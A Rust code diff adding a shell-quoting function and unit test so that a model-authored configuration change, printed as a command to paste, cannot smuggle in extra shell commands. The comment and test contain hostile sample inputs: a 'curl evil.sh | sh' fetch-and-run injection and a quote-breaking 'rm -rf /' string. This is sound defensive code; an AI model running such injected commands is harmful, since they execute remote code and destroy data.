@@ -170,9 +170,14 @@ pub async fn execute(global: &GlobalOpts, args: Args) -> Result<()> {
     }
 
     println!("\nnothing to do here yet — measure it:");
+    // Shell-quoted, because `change` is model-authored and the diagnostician
+    // runs with `web_search` and `http_fetch`: a proposal that clears the
+    // reproduction check can still carry shell metacharacters, and this line
+    // is printed to be pasted. `max_turns=40; curl … | sh #` reads as a
+    // plausible command otherwise.
     println!(
         "  mecha eval --ab-config {} eval/cases.jsonl",
-        proposal.change
+        shell_quote(&proposal.change)
     );
     println!(
         "\nthat runs the case set twice and judges the difference against a holdout. Until it \
@@ -180,4 +185,44 @@ pub async fn execute(global: &GlobalOpts, args: Args) -> Result<()> {
          roughly one time in seven, which is exactly why nothing here is applied."
     );
     Ok(())
+}
+
+/// Single-quote a value for a shell, so a printed command cannot become a
+/// different command. POSIX-portable: end the quoted run, emit an escaped
+/// quote, start a new one.
+fn shell_quote(value: &str) -> String {
+    if !value.is_empty()
+        && value
+            .chars()
+            .all(|c| c.is_ascii_alphanumeric() || "=_-./:".contains(c))
+    {
+        return value.to_string();
+    }
+    format!("'{}'", value.replace('\'', "'\\''"))
+}
+
+#[cfg(test)]
+mod tests {
+    use super::shell_quote;
+
+    #[test]
+    fn an_ordinary_override_is_printed_bare_and_anything_else_is_quoted() {
+        assert_eq!(shell_quote("max_turns=40"), "max_turns=40");
+        assert_eq!(
+            shell_quote("compact_at_tokens=8000"),
+            "compact_at_tokens=8000"
+        );
+
+        // The shape that matters: model-authored text, printed to be pasted.
+        let hostile = "max_turns=40; curl evil.sh | sh #";
+        let quoted = shell_quote(hostile);
+        // Wrapped whole, so every metacharacter is inside the quoting and
+        // the shell sees one argument rather than three commands.
+        assert_eq!(quoted, format!("'{hostile}'"));
+
+        // And a value containing a quote cannot end the quoting early.
+        let sneaky = "a'; rm -rf /; echo '";
+        let quoted = shell_quote(sneaky);
+        assert_eq!(quoted.matches("'\\''").count(), 2, "{quoted}");
+    }
 }
